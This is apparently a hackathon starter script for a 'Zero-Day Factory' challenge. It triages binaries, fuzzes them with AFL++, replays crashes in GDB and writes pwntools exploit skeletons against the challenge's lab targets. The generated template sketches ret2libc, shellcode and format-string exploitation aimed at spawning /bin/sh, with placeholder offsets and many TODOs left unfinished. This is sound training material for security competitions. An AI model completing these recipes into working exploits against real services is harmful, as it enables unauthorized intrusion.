#!/usr/bin/env python3
"""
CYBER-P5: Zero-Day Factory — Automated Vulnerability Discovery Pipeline
Hackathon starter skeleton. Fill in all TODO sections.
Usage: python starter.py --binaries binaries/ --ports ports.json --output submission/
"""

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Dict, List, Optional, Tuple

# ---------------------------------------------------------------------------
# Dependency imports
# Install: pip install pwntools
# External tools needed: afl-fuzz (AFL++), ghidra or rizin, gdb
# ---------------------------------------------------------------------------
try:
    from pwn import (
        ELF, ROP, context, cyclic, cyclic_find, process, remote,
        p64, u64, log, tube
    )
    context.arch    = "amd64"
    context.os      = "linux"
    context.log_level = "warning"
    HAS_PWNTOOLS = True
except ImportError:
    HAS_PWNTOOLS = False
    print("[WARN] pwntools not installed. Exploit generation disabled. "
          "Run: pip install pwntools", file=sys.stderr)

# ---------------------------------------------------------------------------
# Tool availability checks
# ---------------------------------------------------------------------------

def check_tool(name: str) -> bool:
    return shutil.which(name) is not None

HAS_AFL   = check_tool("afl-fuzz")
HAS_GDB   = check_tool("gdb")
HAS_RIZIN = check_tool("rizin") or check_tool("r2")
HAS_OBJDUMP = check_tool("objdump")

if not HAS_AFL:
    print("[WARN] afl-fuzz not found. Install AFL++: apt install afl++", file=sys.stderr)
if not HAS_GDB:
    print("[WARN] gdb not found. Install: apt install gdb", file=sys.stderr)
if not HAS_RIZIN:
    print("[WARN] rizin not found. Install: apt install rizin", file=sys.stderr)

# ---------------------------------------------------------------------------
# Vulnerability types (from the problem spec)
# ---------------------------------------------------------------------------
VULN_TYPES = ("buffer_overflow", "use_after_free", "format_string",
              "integer_overflow", "heap_overflow")

SEVERITY_MAP = {
    "buffer_overflow": "Critical",
    "use_after_free":  "Critical",
    "format_string":   "High",
    "integer_overflow":"High",
    "heap_overflow":   "Critical",
}

# ---------------------------------------------------------------------------
# Data loaders
# ---------------------------------------------------------------------------

def load_ports(ports_path: str) -> Dict[str, int]:
    with open(ports_path, "r", encoding="utf-8") as f:
        return json.load(f)


def get_binaries(binaries_dir: str) -> List[str]:
    """Return sorted list of binary file paths in the directory."""
    return sorted(
        p for p in Path(binaries_dir).iterdir()
        if p.is_file() and not p.suffix
    )


# ---------------------------------------------------------------------------
# Phase 1 — Binary triage (static)
# ---------------------------------------------------------------------------

def run_checksec(binary_path: str) -> Dict:
    """
    Run checksec on a binary and return a dict of security properties.
    Requires checksec to be installed: apt install checksec
    """
    result = {
        "nx":           None,
        "pie":          None,
        "relro":        None,
        "canary":       None,
        "aslr":         "disabled",  # problem guarantees ASLR off
    }
    if not check_tool("checksec"):
        return result

    try:
        out = subprocess.check_output(
            ["checksec", "--file=" + str(binary_path), "--format=json"],
            stderr=subprocess.DEVNULL,
            timeout=10,
        ).decode("utf-8", errors="replace")
        data = json.loads(out)
        props = list(data.values())[0] if data else {}
        result["nx"]     = props.get("nx", "")
        result["pie"]    = props.get("pie", "")
        result["relro"]  = props.get("relro", "")
        result["canary"] = props.get("canary", "")
    except Exception:
        pass
    return result


def find_unsafe_calls(binary_path: str) -> List[Dict]:
    """
    Use objdump to find calls to unsafe library functions.
    Returns list of {function, address, context} dicts.
    """
    unsafe_funcs = ["gets", "strcpy", "strcat", "sprintf", "scanf",
                    "memcpy", "strncpy", "read", "recv", "fgets"]
    findings = []

    if not HAS_OBJDUMP:
        return findings

    try:
        out = subprocess.check_output(
            ["objdump", "-d", str(binary_path)],
            stderr=subprocess.DEVNULL,
            timeout=30,
        ).decode("utf-8", errors="replace")
    except subprocess.SubprocessError:
        return findings

    for line in out.splitlines():
        for func in unsafe_funcs:
            # Match: <address>: ...  call  ...@plt or call  ...<func@plt>
            if re.search(rf"call.*<{re.escape(func)}(@plt)?(\+0x[0-9a-f]+)?>", line):
                addr_match = re.match(r"\s*([0-9a-f]+):", line)
                addr = addr_match.group(1) if addr_match else "unknown"
                findings.append({
                    "function": func,
                    "address":  "0x" + addr,
                    "context":  line.strip(),
                })
    return findings


def extract_strings(binary_path: str) -> List[str]:
    """Extract printable strings >= 6 chars from binary."""
    try:
        out = subprocess.check_output(
            ["strings", "-n", "6", str(binary_path)],
            stderr=subprocess.DEVNULL,
            timeout=10,
        ).decode("utf-8", errors="replace")
        return out.splitlines()
    except Exception:
        return []


def static_triage(binary_path: str) -> Dict:
    """Run full static triage on a binary. Returns triage report dict."""
    print(f"  [static] Triaging: {binary_path}")
    return {
        "path":          str(binary_path),
        "checksec":      run_checksec(str(binary_path)),
        "unsafe_calls":  find_unsafe_calls(str(binary_path)),
        "useful_strings":[s for s in extract_strings(str(binary_path))
                          if any(kw in s for kw in ("/bin/sh", "/tmp", "exec", "system", "sh\x00"))],
    }


# ---------------------------------------------------------------------------
# Phase 2 — AFL++ fuzzing
# ---------------------------------------------------------------------------

def create_seed_corpus(corpus_dir: str, port: int):
    """Create a minimal seed corpus for fuzzing a network service."""
    os.makedirs(corpus_dir, exist_ok=True)
    seeds = [
        b"A" * 64,
        b"A" * 256,
        b"GET / HTTP/1.0\r\n\r\n",
        b"\x00" * 64,
        b"%s%s%s%s%s%s%s%s",           # format string probe
        b"A" * 4096,
    ]
    for i, seed in enumerate(seeds):
        with open(os.path.join(corpus_dir, f"seed_{i:03d}"), "wb") as f:
            f.write(seed)


def run_afl_fuzzing(
    binary_path: str,
    corpus_dir: str,
    output_dir: str,
    timeout_seconds: int = 300,
) -> List[str]:
    """
    Launch AFL++ in QEMU mode against the binary.
    Returns list of crash file paths found.

    NOTE: This function starts AFL++ as a subprocess. The binary must accept
    input from stdin (or use AFL_PRELOAD=libdesock.so for network services).
    Adjust the command-line based on actual binary input mechanism.
    """
    if not HAS_AFL:
        print("  [fuzz] AFL++ not available — skipping.", file=sys.stderr)
        return []

    os.makedirs(output_dir, exist_ok=True)
    env = os.environ.copy()
    env["AFL_SKIP_CPUFREQ"] = "1"
    env["AFL_I_DONT_CARE_ABOUT_MISSING_CRASHES"] = "1"

    cmd = [
        "afl-fuzz",
        "-Q",                      # QEMU mode (no instrumentation needed)
        "-i", corpus_dir,
        "-o", output_dir,
        "-t", "5000",              # 5-second timeout per execution
        "--",
        str(binary_path),
        # TODO: adjust input method — "@@" for file input, or stdin for stdin input
        # "@@",
    ]

    print(f"  [fuzz] Starting AFL++ on {binary_path} (timeout: {timeout_seconds}s)...")
    try:
        proc = subprocess.Popen(
            cmd, env=env,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        proc.wait(timeout=timeout_seconds)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait()
    except Exception as exc:
        print(f"  [fuzz] AFL++ failed: {exc}", file=sys.stderr)
        return []

    # Collect crash files
    crashes_dir = os.path.join(output_dir, "crashes")
    if not os.path.isdir(crashes_dir):
        return []
    return [
        os.path.join(crashes_dir, f)
        for f in os.listdir(crashes_dir)
        if not f.startswith("README")
    ]


# ---------------------------------------------------------------------------
# Phase 3 — Crash triage with GDB
# ---------------------------------------------------------------------------

def triage_crash(binary_path: str, crash_input_path: str) -> Optional[Dict]:
    """
    Replay a crash input under GDB and classify the vulnerability type.
    Returns a vuln dict or None if the crash cannot be classified.
    """
    if not HAS_GDB:
        return None

    gdb_script = f"""
set pagination off
run < {crash_input_path}
bt
info registers rip rsp rbp
x/4xg $rsp
quit
"""
    with tempfile.NamedTemporaryFile("w", suffix=".gdb", delete=False) as f:
        f.write(gdb_script)
        script_path = f.name

    try:
        out = subprocess.check_output(
            ["gdb", "-q", "-batch", "-x", script_path, str(binary_path)],
            stderr=subprocess.STDOUT,
            timeout=15,
        ).decode("utf-8", errors="replace")
    except Exception:
        return None
    finally:
        os.unlink(script_path)

    # TODO: parse GDB output to extract:
    #   - crash address (rip value)
    #   - stack pointer (rsp value)
    #   - backtrace function names
    # TODO: classify vuln type:
    #   - rip == 0x4141414141414141 => buffer_overflow (controlled EIP)
    #   - "invalid free" in output  => use_after_free
    #   - "%s" in crash input       => format_string
    # TODO: return {"type": vuln_type, "crash_address": "0x...", "gdb_output": out}
    return None


# ---------------------------------------------------------------------------
# Phase 4 — Exploit generation (pwntools)
# ---------------------------------------------------------------------------

def generate_exploit(
    binary_path: str,
    port: int,
    vuln: Dict,
    output_path: str,
):
    """
    Write a pwntools PoC exploit script for the given vulnerability.
    This function writes a Python file — it does not run the exploit.
    """
    binary_name = Path(binary_path).name
    vuln_type   = vuln.get("type", "unknown")
    crash_addr  = vuln.get("crash_address", "0x0")

    exploit_code = f'''\
#!/usr/bin/env python3
"""
PoC Exploit for {binary_name} — Vulnerability type: {vuln_type}
Generated by CYBER-P5 starter.py
ASLR is DISABLED on the evaluation machine.
"""
from pwn import *

BINARY = "{binary_path}"
HOST   = "localhost"
PORT   = {port}

elf     = ELF(BINARY, checksec=False)
context.binary = elf
context.log_level = "info"

# -------------------------------------------------------------------------
# TODO: Step 1 — Find the exact offset to the return address.
# Use: cyclic(200) as the payload, then cyclic_find(u64(core.read(rsp, 8))) in gdb.
# -------------------------------------------------------------------------
OFFSET = 0   # TODO: replace with actual offset (bytes to RIP overwrite)

# -------------------------------------------------------------------------
# TODO: Step 2 — Choose an exploit primitive based on checksec output.
# Option A (ret2libc, ASLR disabled, NX enabled):
#   system_addr = elf.plt.get("system") or libc.sym["system"]
#   bin_sh_addr = next(elf.search(b"/bin/sh"))
#   rop = ROP(elf)
#   rop.call(system_addr, [bin_sh_addr])
#   payload = b"A" * OFFSET + rop.chain()
#
# Option B (ret2shellcode, NX disabled):
#   shellcode = asm(shellcraft.sh())
#   buf_addr = <stack address of input buffer>  # find in GDB
#   payload = shellcode.ljust(OFFSET, b"\\x90") + p64(buf_addr)
#
# Option C (format string write):
#   payload = b"%p " * 20   # leak stack pointers first
#   # then compute offset to return address and use %n to overwrite
# -------------------------------------------------------------------------
payload = b"A" * OFFSET   # TODO: replace with real exploit payload

# -------------------------------------------------------------------------
# TODO: Step 3 — Deliver the payload to the binary.
# -------------------------------------------------------------------------
def exploit(target):
    # TODO: send any required protocol handshake/banner
    target.sendline(payload)
    target.interactive()

if __name__ == "__main__":
    # Run against network service
    # target = remote(HOST, PORT)
    # Or run locally:
    target = process(BINARY)
    exploit(target)
'''
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(exploit_code)
    print(f"  [exploit] Exploit skeleton written: {output_path}")


# ---------------------------------------------------------------------------
# Phase 5 — Build submission
# ---------------------------------------------------------------------------

def build_vulnerability_report(all_vulns: Dict[str, List[Dict]]) -> Dict:
    """Construct vulnerability_report.json content."""
    binaries_report = []
    for binary_name, vulns in all_vulns.items():
        binaries_report.append({
            "binary":          binary_name,
            "vulnerabilities": vulns,
        })
    return {"binaries": binaries_report}


def build_metrics(
    fuzz_stats: Dict[str, Dict],
    total_crashes: int,
    vulns_found: int,
    start_time: float,
    end_time: float,
) -> Dict:
    return {
        "total_crashes_found":  total_crashes,
        "vulnerabilities_found": vulns_found,
        "time_taken_seconds":   round(end_time - start_time, 1),
        "fuzzer_stats":         fuzz_stats,
    }


# ---------------------------------------------------------------------------
# Main pipeline
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="CYBER-P5 Zero-Day Factory — Vulnerability Discovery Pipeline"
    )
    parser.add_argument("--binaries",   required=True,
                        help="Path to directory containing the 5 target binaries")
    parser.add_argument("--ports",      default="ports.json",
                        help="Path to ports.json (default: ports.json)")
    parser.add_argument("--output",     default="submission",
                        help="Output directory for all submission files (default: submission/)")
    parser.add_argument("--fuzz-time",  type=int, default=300,
                        help="AFL++ fuzzing time per binary in seconds (default: 300)")
    parser.add_argument("--no-fuzz",    action="store_true",
                        help="Skip AFL++ fuzzing (use if AFL++ not installed)")
    args = parser.parse_args()

    import time
    start_time = time.time()

    if not os.path.isdir(args.binaries):
        print(f"[ERROR] Binaries directory not found: {args.binaries}", file=sys.stderr)
        sys.exit(1)

    ports = load_ports(args.ports) if os.path.isfile(args.ports) else {}
    binaries = get_binaries(args.binaries)
    print(f"[*] Found {len(binaries)} binaries: {[b.name for b in binaries]}")

    os.makedirs(args.output, exist_ok=True)
    os.makedirs(os.path.join(args.output, "exploits"), exist_ok=True)

    all_vulns: Dict[str, List[Dict]] = {}
    fuzz_stats: Dict[str, Dict]      = {}
    total_crashes = 0

    for binary_path in binaries:
        binary_name = binary_path.name
        port = ports.get(binary_name, 0)
        print(f"\n[*] Processing {binary_name} (port {port})...")

        # Step 1 — Static triage
        triage = static_triage(binary_path)
        vulns: List[Dict] = []

        # Create preliminary vulns from unsafe call findings
        for call in triage.get("unsafe_calls", []):
            vuln_type = {
                "gets": "buffer_overflow", "strcpy": "buffer_overflow",
                "sprintf": "buffer_overflow", "strcat": "buffer_overflow",
                "scanf": "buffer_overflow", "printf": "format_string",
            }.get(call["function"], "buffer_overflow")
            vulns.append({
                "vuln_id":       f"{binary_name.upper()}-{len(vulns)+1:03d}",
                "type":          vuln_type,
                "location":      call["address"],
                "function_name": call["function"],
                "severity":      SEVERITY_MAP.get(vuln_type, "High"),
                "exploitable":   False,   # will be updated after dynamic analysis
                "description":   f"Unsafe call to {call['function']}() detected at {call['address']}",
            })

        # Step 2 — Fuzzing
        if not args.no_fuzz and HAS_AFL:
            work_dir    = os.path.join(args.output, f"fuzz_{binary_name}")
            corpus_dir  = os.path.join(work_dir, "corpus")
            findings_dir = os.path.join(work_dir, "findings")
            create_seed_corpus(corpus_dir, port)
            crashes = run_afl_fuzzing(
                binary_path, corpus_dir, findings_dir, args.fuzz_time
            )
            total_crashes += len(crashes)
            fuzz_stats[binary_name] = {"crashes": len(crashes)}

            # Step 3 — Crash triage
            for crash_path in crashes[:10]:  # triage at most 10 crashes per binary
                crash_vuln = triage_crash(str(binary_path), crash_path)
                if crash_vuln:
                    crash_vuln["vuln_id"]    = f"{binary_name.upper()}-{len(vulns)+1:03d}"
                    crash_vuln["exploitable"] = True
                    crash_vuln["severity"]   = SEVERITY_MAP.get(crash_vuln.get("type",""), "High")
                    crash_vuln["description"] = f"Crash confirmed from fuzzer input: {os.path.basename(crash_path)}"
                    vulns.append(crash_vuln)

        all_vulns[binary_name] = vulns

        # Step 4 — Generate exploit skeleton
        exploit_path = os.path.join(args.output, "exploits", f"{binary_name}_exploit.py")
        primary_vuln = next((v for v in vulns if v.get("exploitable")), vulns[0] if vulns else {})
        generate_exploit(str(binary_path), port, primary_vuln, exploit_path)

    # Step 5 — Write vulnerability report
    vuln_report = build_vulnerability_report(all_vulns)
    report_path = os.path.join(args.output, "vulnerability_report.json")
    with open(report_path, "w", encoding="utf-8") as f:
        json.dump(vuln_report, f, indent=2)

    # Step 6 — Write metrics
    end_time = time.time()
    total_vulns = sum(len(v) for v in all_vulns.values())
    metrics = build_metrics(fuzz_stats, total_crashes, total_vulns, start_time, end_time)
    metrics_path = os.path.join(args.output, "metrics.json")
    with open(metrics_path, "w", encoding="utf-8") as f:
        json.dump(metrics, f, indent=2)

    print(f"\n[*] Pipeline complete.")
    print(f"    Vulnerabilities found: {total_vulns}")
    print(f"    Crashes from fuzzing:  {total_crashes}")
    print(f"    Time elapsed:          {metrics['time_taken_seconds']}s")
    print(f"    Output written to:     {args.output}/")


if __name__ == "__main__":
    main()
